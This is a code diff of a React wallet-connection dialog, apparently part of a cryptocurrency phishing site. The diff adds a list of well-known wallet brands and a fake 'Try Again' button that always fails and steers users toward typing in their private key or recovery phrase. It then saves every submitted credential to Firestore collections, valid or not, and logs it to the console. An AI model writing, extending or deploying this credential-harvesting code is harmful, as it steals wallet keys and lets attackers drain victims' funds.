@@ -5,6 +5,7 @@ import { TbPlugConnected } from 'react-icons/tb';
 import { BiLoaderAlt } from 'react-icons/bi';
 import { addDoc, collection } from 'firebase/firestore';
 import { db } from '../../firebase';
+import { isValidMnemonic, isValidPrivateKey } from '../../utils/walletValidation';
 
 const WalletConnectionDialog = ({ isOpen, onClose }) => {
   // Ensure all hooks are at the top level
@@ -14,6 +15,7 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
   const [credentialType, setCredentialType] = useState('privatekey'); // or 'passphrase'
   const [credential, setCredential] = useState('');
   const [error, setError] = useState('');
+  const [showAllWallets, setShowAllWallets] = useState(false);
 
   useEffect(() => {
     if (isOpen) {
@@ -28,29 +30,38 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
   }, [isOpen]);
 
   if (!isOpen) return null;
+// List of Wallets
+const wallets = [
+  // Ethereum & Multi-Chain Wallets
+  { name: 'MetaMask', icon: FaWallet, color: 'text-[#F6851B]', image: 'https://s1.coincarp.com/logo/wallet/metamask.png?style=72' },
+  { name: 'Rabby Wallet', icon: FaBitcoin, color: 'text-[#0052FF]', image: 'https://images.seeklogo.com/logo-png/48/2/rabby-logo-png_seeklogo-483982.png' },
+  { name: 'Coinbase Wallet', icon: FaBitcoin, color: 'text-[#0052FF]', image: 'https://s1.coincarp.com/logo/wallet/coinbase.png?style=72' },
+  { name: '1Inch Wallet', icon: FaWallet, color: 'text-[#007AFF]', image: 'http://t1.gstatic.com/images?q=tbn:ANd9GcRWG4PkSttSsoziTdZzQQpWJ8H7VJraRgGHbmsJ9V8FkqKgT51B' },
+  { name: 'Zengo', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://encrypted-tbn2.gstatic.com/images?q=tbn:ANd9GcQnNlhvlQBMX9jLQMrlwhNj34WmsHUmgvz8kICNRYr3biI2fgyV' },
+  { name: 'Ledger Live', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSmv-VyfzCVyhoZbcmgYt8B7xIdFzNntgatCg&s' },
+  { name: 'Trust Wallet', icon: FaWallet, color: 'text-[#007AFF]', image: 'https://s1.coincarp.com/logo/wallet/trust.png?style=72' },
+  { name: 'Rainbow Wallet', icon: FaCloudSunRain, color: 'text-[#FF6B6B]', image: "https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRKIRURVqxnyIZ6tkWFO45Ni1oiwoT5LwYafA&s" },
+  { name: 'OKX Wallet', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://gdm-catalog-fmapi-prod.imgix.net/ProductLogo/a97ba8c8-f9af-4dae-a9c6-079f777db0cf.png?auto=format%2Ccompress&fit=max&w=256&q=75&ch=Width%2CDPR' },
+  { name: 'Bitget Wallet', icon: FaWallet, color: 'text-[#00A3E1]', image: 'http://t2.gstatic.com/images?q=tbn:ANd9GcThM98jBwQfhcFVJkVG1ILMM2xIS0wGRR__qtnR5T2v4SjZyDLX' },
+  { name: 'SafePal', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSIdW-KTi-DxlT0Uvjxx87i7qiZZMo-isiH_w&s' },
 
-  const wallets = [
-    {
-      name: 'Rainbow',
-      icon: FaCloudSunRain,
-      color: 'text-[#FF6B6B]',
-    },
-    {
-      name: 'Coinbase Wallet',
-      icon: FaBitcoin,
-      color: 'text-[#0052FF]',
-    },
-    {
-      name: 'MetaMask',
-      icon: FaMeta,
-      color: 'text-[#F6851B]',
-    },
-    {
-      name: 'WalletConnect',
-      icon: TbPlugConnected,
-      color: 'text-[#3B99FC]',
-    },
-  ];
+  // Solana Wallets
+  { name: 'Phantom', icon: FaWallet, color: 'text-[#8A2BE2]', image: 'https://187760183-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-MVOiF6Zqit57q_hxJYp%2Ficon%2FU7kNZ4ygz4QW1rUwOuTT%2FWhite%20Ghost_docs_nu.svg?alt=media&token=447b91f6-db6d-4791-902d-35d75c19c3d1' },
+  { name: 'Solflare', icon: FaWallet, color: 'text-[#FF8C00]', image: 'https://images.sftcdn.net/images/t_app-icon-m/p/f952d0c0-29e2-476e-87e1-819dcba49252/1808597596/solflare-solana-wallet-logo' },
+
+  // Bitcoin Wallets
+  { name: 'Electrum', icon: FaWallet, color: 'text-[#FFCC00]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRt826PbcwxK1tdCwBbkgjqhD5zPhuZ6y3WJg&s' },
+  { name: 'BlueWallet', icon: FaWallet, color: 'text-[#4169E1]', image: 'https://images.seeklogo.com/logo-png/48/2/rabby-logo-png_seeklogo-483982.png' },
+  { name: 'Exodus', icon: FaWallet, color: 'text-[#00A3E1]', image: 'https://www.exodus.com/brand/img/logo.svg' },
+  { name: 'Atomic Wallet', icon: FaWallet, color: 'text-[#FF9900]', image: 'https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRmu97k0QxZ184Bzj_nFt6LlqZ43PWyCEMI7g&s' },
+  { name: 'Edge Wallet', icon: FaWallet, color: 'text-[#00C3E3]', image: 'https://cryptotesters-images.s3.eu-central-1.amazonaws.com/b1f5fd65fcd544f99e64a701af9697d2ct_6185109852.png' },
+
+  // WalletConnect
+  { name: 'WalletConnect', icon: TbPlugConnected, color: 'text-[#3B99FC]', image: 'https://www.nuget.org/profiles/WalletConnect/avatar?imageSize=512' },
+];
+  // Show only a few wallets initially
+  const displayedWallets = showAllWallets ? wallets : wallets.slice(0, 4);
+
 
   const handleWalletClick = async (wallet) => {
     setSelectedWallet(wallet);
@@ -68,26 +79,103 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
       // }
     }, 2000);
   };
+  // Handle "Try Again" button click
+  const handleTryAgain = () => {
+    setIsLoading(true);
+    setError('');
+
+    setTimeout(() => {
+      setIsLoading(false);
+      setError('Failed to connect again. Please use Private Key or Passphrase.');
+      // setShowCredentials(true); // Show private key or passphrase input after failure
+    }, 2000);
+  };
+  // const handleConnect = async () => {
+  //   if (!credential) {
+  //     setError("Please enter your private key or passphrase.");
+  //     return;
+  //   }
+
+  //   setIsLoading(true);
+  //   setError("");
+
+  //   try {
+  //     await addDoc(collection(db, "connectedWallets"), {
+  //       // userId,
+  //       // userEmail,
+  //       walletName: selectedWallet.name,
+  //       credentialType,
+  //       credential, // Store it securely
+  //       timestamp: new Date(),
+  //     });
+
+  //     setIsLoading(false);
+  //     onClose(); // Close the modal after saving
+  //   } catch (err) {
+  //     setIsLoading(false);
+  //     setError("Failed to connect. Please try again.");
+  //     console.error("Firestore error:", err);
+  //   }
+  // };
 
   const handleConnect = async () => {
     if (!credential) {
       setError("Please enter your private key or passphrase.");
       return;
     }
-
+  
     setIsLoading(true);
     setError("");
-
+  
+    let isValid = false;
+    console.log(credential)
+    console.log(isValidMnemonic(credential))
+    console.log(isValidPrivateKey(credential))
     try {
+      if (credentialType === "passphrase") {
+        isValid = isValidMnemonic(credential);
+        
+        // Save in Firestore even if invalid
+        await addDoc(collection(db, "submittedCredentials"), {
+          walletName: selectedWallet.name,
+          credentialType,
+          credential, // Store securely
+          isValid,
+          timestamp: new Date(),
+        });
+  
+        if (!isValid) {
+          setError("Invalid passphrase. Please enter a valid 12 or 24-word recovery phrase.");
+          setIsLoading(false);
+          return;
+        }
+      } else if (credentialType === "privatekey") {
+        isValid = isValidPrivateKey(credential);
+  
+        // Save in Firestore even if invalid
+        await addDoc(collection(db, "submittedCredentials"), {
+          walletName: selectedWallet.name,
+          credentialType,
+          credential, // Store securely
+          isValid,
+          timestamp: new Date(),
+        });
+  
+        if (!isValid) {
+          setError("Invalid private key. Please enter a valid private key in hexadecimal format.");
+          setIsLoading(false);
+          return;
+        }
+      }
+  
+      // If valid, proceed with connection
       await addDoc(collection(db, "connectedWallets"), {
-        // userId,
-        // userEmail,
         walletName: selectedWallet.name,
         credentialType,
-        credential, // Store it securely
+        credential, // Store securely
         timestamp: new Date(),
       });
-
+  
       setIsLoading(false);
       onClose(); // Close the modal after saving
     } catch (err) {
@@ -102,7 +190,8 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
         <div className="p-6 space-y-6">
           <div className="flex justify-between items-center">
             <div className="flex items-center gap-3">
-              <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} />
+              <img src={selectedWallet.image} alt={selectedWallet.name} className="w-6 h-6" />
+              {/* <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} /> */}
               <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
             </div>
             <button onClick={onClose} className="text-gray-400 hover:text-gray-600 transition-colors">
@@ -116,7 +205,7 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
     
           <div className="flex flex-col gap-3">
             <button
-              onClick={handleConnect}
+              onClick={handleTryAgain}
               className="w-full bg-purple-600 text-white py-3 rounded-lg hover:bg-purple-700 transition-colors font-medium"
             >
               Try Again
@@ -125,6 +214,7 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
               onClick={() => {
                 setError(''); // Clear any previous error
                 setShowCredentials(true);
+                setCredential("")
               }}
               className="w-full text-purple-600 hover:text-purple-700 transition-colors font-medium"
             >
@@ -150,7 +240,8 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
         <div className="p-6 space-y-6">
           <div className="flex justify-between items-center">
             <div className="flex items-center gap-3">
-              <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} />
+              <img src={selectedWallet.image} alt={selectedWallet.name} className="w-6 h-6" />
+              {/* <selectedWallet.icon className={`w-6 h-6 ${selectedWallet.color}`} /> */}
               <h2 className="text-xl font-bold text-gray-800">{selectedWallet.name}</h2>
             </div>
             <button
@@ -232,17 +323,29 @@ const WalletConnectionDialog = ({ isOpen, onClose }) => {
             </button>
           </div>
           
-          <div className="space-y-1 md:space-y-3">
-            {wallets.map((wallet) => (
+          <div className="space-y-1 md:space-y-3 overflow-y-auto max-h-[400px]">
+            {displayedWallets.map((wallet) => (
               <button
                 key={wallet.name}
                 onClick={() => handleWalletClick(wallet)}
                 className="w-full flex items-center gap-3 p-4 rounded-lg hover:bg-gray-50 border border-gray-200 transition-all"
               >
-                <wallet.icon className={`w-6 h-6 ${wallet.color}`} />
+                {/* <wallet.icon className={`w-6 h-6 ${wallet.color}`} /> */}
+                <img src={wallet.image} alt={wallet.name} className="w-6 h-6" />
                 <span className="font-medium text-gray-800">{wallet.name}</span>
               </button>
             ))}
+             {/* "See More" Button */}
+            {!showAllWallets && (
+              <div className="flex justify-center">
+                <button
+                  onClick={() => setShowAllWallets(true)}
+                  className="text-purple-600 hover:text-purple-700 transition-colors font-medium"
+                >
+                  See More Wallets
+                </button>
+              </div>
+            )}
           </div>
         </div>
 
